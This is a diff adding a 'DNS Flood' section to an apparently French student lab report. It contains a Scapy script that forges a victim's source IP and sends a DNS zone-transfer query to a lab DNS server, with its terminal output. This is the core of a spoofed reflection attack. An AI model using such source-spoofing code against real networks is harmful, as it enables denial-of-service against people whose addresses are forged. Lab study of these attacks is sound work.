@@ -998,3 +998,34 @@ tp3.b2
 > 
 
 ```
+
+#### DNS Flood
+
+┌──(byby㉿byby)-[~/python_nabik/scpay]
+└─$ sudo python3 dns_flood.py
+DNS spoof query sent from 10.3.1.2 to 10.3.3.1
+
+(pas utile je pense mais oklm)
+
+```
+from scapy.all import *
+
+# Adresse IP de la victime (spoofed)
+victim_ip = "10.3.1.2"
+
+# Adresse IP du serveur DNS
+dns_server_ip = "10.3.3.1"
+
+# Créer un paquet DNS
+dns_request = IP(src=victim_ip, dst=dns_server_ip)/UDP(sport=12345, dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype="AXFR"))
+
+# Envoyer la requête DNS spoofée
+send(dns_request, verbose=0)
+
+print(f"DNS spoof query sent from {victim_ip} to {dns_server_ip}")
+```
+
+┌──(byby㉿byby)-[~/python_nabik/scpay]
+└─$ sudo python3 dns_flood.py
+DNS spoof query sent from 10.3.1.2 to 10.3.3.1
+
